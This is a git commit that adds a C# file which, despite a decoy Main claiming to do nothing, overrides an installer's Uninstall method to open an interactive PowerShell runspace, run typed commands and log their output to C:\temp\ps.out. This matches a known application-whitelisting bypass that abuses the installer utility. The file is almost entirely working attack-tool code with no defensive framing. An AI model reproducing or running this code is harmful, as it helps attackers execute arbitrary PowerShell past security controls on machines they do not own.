aa650f862f8f8e8f8388880981e36e65bfad0eb0
md347 <688628+md347@users.noreply.github.com>
2024-02-13 16:07:07 +0000

    Create powainstall-log.cs

---
+++ powainstall-log.cs
@@ -0,0 +1,63 @@
+using System;
+using System.IO;
+using System.Diagnostics;
+using System.Reflection;
+using System.Configuration.Install;
+using System.Runtime.InteropServices;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Text;
+
+public class Program
+{
+    public static void Main()
+    {
+        Console.WriteLine("Hello From Main...I Don't Do Anything");
+
+    }
+
+}
+
+[System.ComponentModel.RunInstaller(true)]
+public class Sample : System.Configuration.Install.Installer
+{
+    public override void Uninstall(System.Collections.IDictionary savedState)
+    {
+        string outputFilePath = @"C:\temp\ps.out"; // Output file path
+
+        using (StreamWriter writer = new StreamWriter(outputFilePath, true))
+        {
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+
+            while (true)
+            {
+                Console.Write(">");
+                Pipeline pipeline = runspace.CreatePipeline();
+                string cmd = Console.ReadLine();
+                pipeline.Commands.AddScript(cmd);
+                pipeline.Commands.Add("Out-String");
+                try
+                {
+                    Collection<PSObject> results = pipeline.Invoke();
+                    StringBuilder stringBuilder = new StringBuilder();
+                    foreach (PSObject obj in results)
+                    {
+                        stringBuilder.Append(obj);
+                    }
+
+                    string output = stringBuilder.ToString().Trim();
+                    Console.WriteLine(output); // Output to console
+                    writer.WriteLine(output); // Write to file
+                }
+                catch (Exception e)
+                {
+                    string errorMessage = e.ToString();
+                    Console.WriteLine(errorMessage); // Output error to console
+                    writer.WriteLine(errorMessage); // Write error to file
+                }
+            }
+        }
+    }
+}
